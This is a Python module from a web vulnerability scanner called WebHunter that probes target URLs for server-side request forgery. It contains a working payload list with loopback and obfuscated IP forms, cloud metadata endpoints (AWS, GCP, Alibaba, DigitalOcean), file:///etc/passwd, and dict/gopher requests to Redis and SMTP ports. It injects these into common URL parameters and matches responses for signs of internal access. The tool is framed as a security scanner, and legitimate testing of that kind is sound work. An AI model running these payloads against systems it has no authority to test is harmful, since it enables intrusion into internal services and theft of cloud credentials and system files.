#!/usr/bin/env python3
"""
WebHunter - Server-Side Request Forgery (SSRF) Scanner
"""

from core.logger import HunterLogger
from core.engine import Vulnerability
from core.utils import make_request, inject_payload_in_params, extract_links, delay

log = HunterLogger("SSRF")


class SSRFScanner:
    """SSRF vulnerability scanner"""

    def __init__(self, target, engine):
        self.target = target
        self.engine = engine
        self.findings = []

        self.payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://[::1]",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
            "http://169.254.169.254",  # AWS metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            "http://100.100.100.200/latest/meta-data/",  # Alibaba
            "http://169.254.169.254/metadata/v1/",  # DigitalOcean
            "http://2130706433",  # Decimal IP for 127.0.0.1
            "http://0x7f000001",  # Hex IP
            "http://017700000001",  # Octal
            "http://127.1",
            "http://127.0.1",
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            "dict://127.0.0.1:6379/info",  # Redis
            "gopher://127.0.0.1:25/",
        ]

        # SSRF-prone parameters
        self.ssrf_params = [
            "url", "uri", "path", "dest", "redirect", "out", "view",
            "page", "dir", "show", "navigation", "open", "file", "val",
            "validate", "domain", "callback", "return", "feed", "host",
            "port", "to", "reference", "site", "html", "data", "load",
            "request", "proxy", "img", "image", "source", "src",
        ]

        # Indicators of internal access
        self.internal_indicators = [
            "root:", "/bin/bash", "/bin/sh",  # /etc/passwd
            "[fonts]", "[extensions]",  # win.ini
            "ami-id", "instance-type", "local-hostname",  # AWS metadata
            "computeMetadata", "google",  # GCP metadata
            "privateIp", "publicIp",
            "Connection refused", "Connection reset",
        ]

    def scan(self):
        """Run SSRF scan"""
        log.info(f"Testing SSRF on {self.target.url}")

        self._test_url_params()
        self._test_ssrf_endpoints()

        return self.findings

    def _test_url_params(self):
        """Test URL parameters for SSRF"""
        resp = make_request(self.target.url)
        if not resp:
            return

        links = extract_links(resp.text, self.target.url)
        param_urls = [l for l in links if "?" in l]

        test_urls = param_urls[:10]
        if "?" in self.target.url:
            test_urls.insert(0, self.target.url)

        for url in test_urls:
            for payload in self.payloads[:10]:
                injected = inject_payload_in_params(url, payload)
                for inj in injected:
                    r = make_request(inj["url"], allow_redirects=False)
                    if r:
                        for indicator in self.internal_indicators:
                            if indicator.lower() in r.text.lower():
                                vuln = Vulnerability(
                                    title="Server-Side Request Forgery (SSRF)",
                                    severity="CRITICAL",
                                    description=f"SSRF detected - internal content accessible via parameter '{inj['param']}'",
                                    url=inj["url"],
                                    param=inj["param"],
                                    payload=payload,
                                    evidence=indicator,
                                    remediation="Whitelist allowed URLs/domains. Block internal IP ranges. Use URL parsers.",
                                    owasp_category="A10 - SSRF",
                                    module="SSRF Scanner"
                                )
                                self.engine.add_vulnerability(vuln)
                                self.findings.append(vuln)
                                return
                    delay()

    def _test_ssrf_endpoints(self):
        """Test common SSRF-prone endpoints"""
        endpoints = []
        for param in self.ssrf_params:
            endpoints.append(f"{self.target.url}?{param}=")

        for endpoint in endpoints[:15]:
            for payload in self.payloads[:5]:
                test_url = endpoint + payload
                r = make_request(test_url, allow_redirects=False)
                if r:
                    for indicator in self.internal_indicators:
                        if indicator.lower() in r.text.lower():
                            vuln = Vulnerability(
                                title="SSRF via Common Parameter",
                                severity="HIGH",
                                description=f"SSRF detected on endpoint with payload: {payload}",
                                url=test_url,
                                payload=payload,
                                evidence=indicator,
                                remediation="Validate and sanitize URLs. Block internal IP ranges.",
                                owasp_category="A10 - SSRF",
                                module="SSRF Scanner"
                            )
                            self.engine.add_vulnerability(vuln)
                            self.findings.append(vuln)
                            return
                delay()

        return self.findings
